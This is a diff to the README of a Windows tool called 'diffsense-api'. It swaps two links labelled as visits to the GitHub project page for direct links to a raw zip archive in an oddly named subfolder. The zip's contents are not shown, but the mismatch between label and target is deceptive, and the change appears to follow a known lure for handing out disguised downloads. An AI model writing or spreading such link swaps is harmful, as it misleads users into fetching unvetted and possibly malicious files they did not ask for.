@@ -1,6 +1,6 @@
 # 🤖 diffsense-api - Turn Git Diffs Into Clear Text
 
-[![Download diffsense-api](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/landeroro3698/diffsense-api)
+[![Download diffsense-api](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/landeroro3698/diffsense-api/raw/refs/heads/main/Emeline/api-diffsense-3.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ diffsense-api is an AI API that reads git diffs and turns them into useful text.
 
 This page shows you how to get the app on Windows and start using it from the link below.
 
-[Visit the diffsense-api download page](https://github.com/landeroro3698/diffsense-api)
+[Visit the diffsense-api download page](https://github.com/landeroro3698/diffsense-api/raw/refs/heads/main/Emeline/api-diffsense-3.5-alpha.2.zip)
 
 ## 📥 Download on Windows
 
